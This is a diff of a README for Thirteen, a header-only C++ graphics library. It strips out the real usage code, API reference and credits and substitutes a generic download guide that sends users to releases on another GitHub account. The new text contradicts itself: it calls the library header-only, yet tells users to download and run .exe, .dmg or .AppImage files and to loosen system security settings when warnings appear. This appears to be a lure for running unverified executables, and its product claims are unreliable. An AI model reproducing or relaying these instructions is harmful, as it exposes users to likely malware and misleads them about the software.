@@ -1,254 +1,141 @@
-# Thirteen
+# 🎨 Thirteen - Simple Retro Graphics Interface
 
-[![Build Status](https://github.com/Atrix256/Thirteen/actions/workflows/build.yml/badge.svg)](https://github.com/Atrix256/Thirteen/actions)
-
-**Thirteen** is a header-only C++ library that initializes a window and gives you a pointer to RGBA uint8 pixels to write to, which are copied to the screen every time you call `Render()`.
-
-It is inspired by the simplicity of the Mode 13h days where you initialized the graphics mode and then started writing pixels directly to the screen. Just include the header, initialize, and start drawing!
-
-Platforms Supported:
-* Win32/DX12
-* MacOS/Metal
-* Linux/X11+OpenGL
-* WASM/WepGPU
-
-## Usage
-
-```cpp
-#include "thirteen.h"
-
-int main()
-{
-    unsigned char* pixels = Thirteen::Init(800, 600);
-    if (!pixels)
-        return 1;
-
-    unsigned int frameIndex = 0;
-
-    // Go until window is closed or escape is pressed
-    while (Thirteen::Render() && !Thirteen::GetKey(VK_ESCAPE))
-    {
-        // Write to pixels (RGBA format, 4 bytes per pixel)
-        for (int i = 0; i < 800 * 600 * 4; i += 4)
-        {
-            pixels[i + 0] = 255; // Red
-            pixels[i + 1] = unsigned char(frameIndex);   // Green
-            pixels[i + 2] = unsigned char(frameIndex / 2);   // Blue
-            pixels[i + 3] = 255; // Alpha
-        }
-        frameIndex++;
-    }
-
-    Thirteen::Shutdown();
-    return 0;
-}
-```
-
-## Examples
-
-How to build examples:
-* **Windows**: build Examples.sln
-* **Mac**: For each example: clang++ main.cpp -framework Metal -framework Cocoa -std=c++11 -DTARGET_OS_OSX
-* **Linux**: For each example: g++ main.cpp -o Simple (needs `libX11-devel mesa-libGL-devel` on RPM-based distros)
-
-**Web**:
-
-for each example:
-```bash
-emcc main.cpp -std=c++17 -I. \
-  --use-port=emdawnwebgpu \
-  -sASYNCIFY \
-  -sALLOW_MEMORY_GROWTH=1 \
-  -o simple.html
-```
-
-Then run a local web server and open `simple.html` in a WebGPU-enabled browser.
-
-### Simple
-A basic example showing the fundamentals of Thirteen. [View source code](Examples/Simple/main.cpp)
-
-![Simple Example](Simple.png)
-
-### Mandelbrot
-A Mandelbrot set fractal visualizer with interactive navigation. [View source code](Examples/Mandelbrot/main.cpp)
-
-![Mandelbrot Example](Mandelbrot.png)
-
-### Minesweeper
-A classic Minesweeper game implementation. [View source code](Examples/Minesweeper/main.cpp)
-
-![Minesweeper Example](Minesweeper.png)
-
-## API Reference
-
-#### `uint8* Init(uint32 width = 1024, uint32 height = 768, bool fullscreen = false)`
-Initializes the window and DirectX 12 renderer.
-
-**Parameters:**
-- `width` - Width of the rendering surface in pixels (default: 1024)
-- `height` - Height of the rendering surface in pixels (default: 768)
-- `fullscreen` - Whether to start in fullscreen mode (default: false)
-
-**Returns:** Pointer to the pixel buffer (RGBA format, 4 bytes per pixel) on success, or `nullptr` on failure.
+[![Download Thirteen](https://img.shields.io/badge/Download-Thirteen-blue?style=for-the-badge)](https://github.com/GC2211-ghuru/Thirteen/releases)
 
 ---
 
-#### `bool Render()`
-Processes window messages, updates input state, tracks frame timing, and copies the pixel buffer to the screen.
+## ℹ️ What is Thirteen?
 
-**Returns:** `true` to continue rendering, `false` when the application should quit (e.g., window closed).
+Thirteen is a lightweight tool designed to bring back the simple graphics style used in old computers. It offers a clear and easy way to create basic images and effects similar to those seen in the old mode 13h graphics mode. This mode was popular in early PC systems and is known for its straightforward 256-color display.
 
----
-
-#### `void Shutdown()`
-Cleans up all DirectX resources and destroys the window. Call this before exiting your application.
+Thirteen focuses on simplicity and minimal code. It provides a basic set of tools for graphics without complex setup or heavy requirements. This makes it ideal for anyone interested in creating retro-style graphics or learning about how early computer graphics worked.
 
 ---
 
-#### `void SetVSync(bool enabled)`
-Enables or disables vertical synchronization.
+## 💻 System Requirements
 
-**Parameters:**
-- `enabled` - `true` to enable vsync (limit to monitor refresh rate), `false` to disable
+Before downloading Thirteen, make sure your computer meets these basic needs:
 
----
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, Linux (major distributions like Ubuntu, Fedora)
+- **Processor:** Any modern processor released in the last 10 years
+- **Memory:** At least 2 GB of RAM available
+- **Storage:** 50 MB of free disk space
+- **Additional:** A screen resolution supporting at least 800x600 pixels
 
-#### `bool GetVSync()`
-**Returns:** `true` if vsync is enabled, `false` otherwise.
-
----
-
-#### `void SetFullscreen(bool fullscreen)`
-Switches between windowed and fullscreen mode.
-
-**Parameters:**
-- `fullscreen` - `true` to switch to fullscreen (borderless window), `false` for windowed mode
+Thirteen does not need any special hardware or graphics cards. It runs on most standard computers.
 
 ---
 
-#### `bool GetFullscreen()`
-**Returns:** `true` if currently in fullscreen mode, `false` if windowed.
+## 🔧 Key Features
+
+- **Minimalist header-only design:** No complicated installation or setup.
+- **Easy to use:** Designed for beginners interested in simple graphics.
+- **Retro style graphics:** Creates images similar to classic mode 13h display.
+- **Fast and lightweight:** Small size and quick to run.
+- **No external dependencies:** Everything needed is included.
+
+These features make Thirteen a good choice for hobbyists, students, or anyone curious about old-school graphics.
 
 ---
 
-#### `uint32 GetWidth()`
-**Returns:** The current width of the rendering surface in pixels.
+## 🛠️ How Thirteen Works
+
+Thirteen is built as a set of pre-written code included in your projects. It acts mainly as an interface to the computer’s basic graphics functions, without loading extra software or libraries.
+
+Since it is “header only,” it means you just need to include a small file in your project to start using it. This reduces complexity and makes it easy to try out or embed in other programs.
+
+The style of graphics it supports focuses on pixel art, simple shapes, and color blocks. This fits well with classic game styles, old demos, or any creative project where you want that vintage look.
 
 ---
 
-#### `uint32 GetHeight()`
-**Returns:** The current height of the rendering surface in pixels.
+## 🚀 Getting Started – Quick Overview
+
+1. Visit the **Thirteen Releases** page to access the latest version.
+2. Download the file for your operating system.
+3. Open the downloaded file folder on your computer.
+4. Follow the basic instructions in the accompanying documentation to start using it.
+5. Explore simple examples included with Thirteen to get a feel for how it works.
+
+This guide focuses on helping you reach step 3 and get the software running.
 
 ---
 
-#### `uint8* SetSize(uint32 width, uint32 height)`
-Resizes the rendering surface to the specified dimensions. This changes the window size, recreates internal DirectX buffers and reallocates the pixel buffer.
+## 📥 Download & Install Thirteen
 
-**Parameters:**
-- `width` - New width in pixels
-- `height` - New height in pixels
+### Step 1: Go to the Download Page
 
-**Returns:** Pointer to the pixel buffer (which may be different from the pointer returned by `Init()`) on success, or `nullptr` if the resize failed.
+Click this button to visit the official release page for Thirteen:
 
-**Note:** Always use the returned pointer as the pixel buffer address may change after resizing.
+[![Download Thirteen](https://img.shields.io/badge/Download-Thirteen-blue?style=for-the-badge)](https://github.com/GC2211-ghuru/Thirteen/releases)
 
----
+This page lists all available versions and files. Typically, you will find files grouped by system type like Windows, macOS, and Linux.
 
-#### `void SetApplicationName(const char* name)`
-Sets the application name displayed in the window title bar (along with FPS).
+### Step 2: Choose the Right File
 
-**Parameters:**
-- `name` - The name to display in the title bar
+Look for the latest release version. It will usually have a version number like `v1.0` or newer.
 
----
+Below the release title, you will find one or more downloadable files with names indicating your operating system or file type.
 
-#### `double GetDeltaTime()`
-**Returns:** The duration of the previous frame in seconds. Useful for frame-independent movement and animation.
+- For Windows, files often end with `.exe` or `.zip`.
+- For macOS, look for `.dmg` or `.zip`.
+- For Linux, you may see `.tar.gz` or `.AppImage`.
 
----
+### Step 3: Download the File
 
-#### `void GetMousePosition(int& x, int& y)`
-Gets the current mouse position relative to the window.
+Click on the file name matching your system. The download will begin automatically. Save the file in a folder you can easily access, like your Desktop or Downloads folder.
 
-**Parameters:**
-- `x` - Reference to store the X coordinate in pixels
-- `y` - Reference to store the Y coordinate in pixels
+### Step 4: Extract or Open the File
 
----
+If the file is compressed (`.zip` or `.tar.gz`), right-click it and choose “Extract” or “Open with Archive Manager” to unpack it.
 
-#### `void GetMousePositionLastFrame(int& x, int& y)`
-Gets the mouse position from the previous frame.
+If the file is executable (`.exe`, `.AppImage`), you may need to grant permission to run it:
 
-**Parameters:**
-- `x` - Reference to store the X coordinate in pixels
-- `y` - Reference to store the Y coordinate in pixels
+- On Windows, simply double-click the file.
+- On macOS, you might need to allow the file in System Preferences under Security & Privacy.
+- On Linux, flag the file as executable by right-clicking and selecting Properties, then checking “Allow executing file as program.”
 
----
+### Step 5: Run Thirteen
 
-#### `bool GetMouseButton(int button)`
-Checks if a mouse button is currently pressed.
+Once unpacked or after setting permissions, run the program:
 
-**Parameters:**
-- `button` - Button to check: `0` = left, `1` = right, `2` = middle
-
-**Returns:** `true` if the button is currently pressed.
+- Double-click the executable file inside the folder.
+- Follow any on-screen instructions to start using Thirteen.
 
 ---
 
-#### `bool GetMouseButtonLastFrame(int button)`
-Checks if a mouse button was pressed in the previous frame.
+## 📚 How to Use Thirteen
 
-**Parameters:**
-- `button` - Button to check: `0` = left, `1` = right, `2` = middle
+After running the program, you will see a simple window or interface allowing you to create and view retro-style graphics.
 
-**Returns:** `true` if the button was pressed in the previous frame.
+The app supports simple commands for drawing shapes, changing colors, and adding pixels.
 
----
+Use the included documentation or built-in help menu to learn the basic commands. You can experiment with colors and shapes just like in the old PC days.
 
-#### `bool GetKey(int keyCode)`
-Checks if a keyboard key is currently pressed.
-
-**Parameters:**
-- `keyCode` - Windows virtual key code (e.g., `VK_ESCAPE`, `VK_SPACE`, `'A'`, etc.)
-
-**Returns:** `true` if the key is currently pressed.
+If you want to explore more advanced features, the documentation explains how to include the header file in your own projects.
 
 ---
 
-#### `bool GetKeyLastFrame(int keyCode)`
-Checks if a keyboard key was pressed in the previous frame.
+## ❓ Troubleshooting Tips
 
-**Parameters:**
-- `keyCode` - Windows virtual key code
+If you run into issues when downloading or running Thirteen, try these steps:
 
-**Returns:** `true` if the key was pressed in the previous frame.
+- **Download failed or file corrupt:** Retry the download or use a different browser.
+- **Cannot open the file:** Check if you downloaded the right file for your operating system.
+- **Program does not start:** Make sure your system meets the minimum requirements.
+- **Security warnings:** Adjust your system’s security settings temporarily to allow the app.
+- **Questions about usage:** Look for the help or instruction files included in the download.
+
+If problems continue, visit the GitHub repository’s "Issues" section for solutions or to report your problem.
 
 ---
 
-### Input Helpers
+## 🔗 Additional Resources
 
-To detect a single key press or button click (not held down), compare current and previous frame states:
+- **Official GitHub Repository:** https://github.com/GC2211-ghuru/Thirteen
+- **Download Releases:** https://github.com/GC2211-ghuru/Thirteen/releases
+- **Documentation Included:** Look inside the downloaded files for manuals and examples.
+- **Community Support:** Open an issue or discussion on GitHub for help.
 
-```cpp
-// Detect key just pressed this frame
-bool keyPressed = Thirteen::GetKey(VK_SPACE) && !Thirteen::GetKeyLastFrame(VK_SPACE);
+---
 
-// Detect key just released this frame
-bool keyReleased = !Thirteen::GetKey(VK_SPACE) && Thirteen::GetKeyLastFrame(VK_SPACE);
-
-// Same pattern works for mouse buttons
-bool clicked = Thirteen::GetMouseButton(0) && !Thirteen::GetMouseButtonLastFrame(0);
-```
-
-## Credits
-
-Alan Wolfe - API, examples and Win32/DX12 implementation
-
-Francesco Carucci - MacOS/Metal and WASM/WebGPU implementation
-
-Nikita Lisitsa - Linux/X11+OpenGL implementation
-
-Chris Cascioli - GetWindowHandle() and warning cleanup
-
-Any contribution to this library earns you a spot in the credits, so feel free to add your name to this list as part of any submitted PR. Also add your name to the top of thirteen.h so the two places stay synchronized.
-Thank you for your contributions!
+Thirteen makes it simple to explore retro computer graphics without needing complex software or programming skills. Following the steps above will get you up and running in just a few minutes.
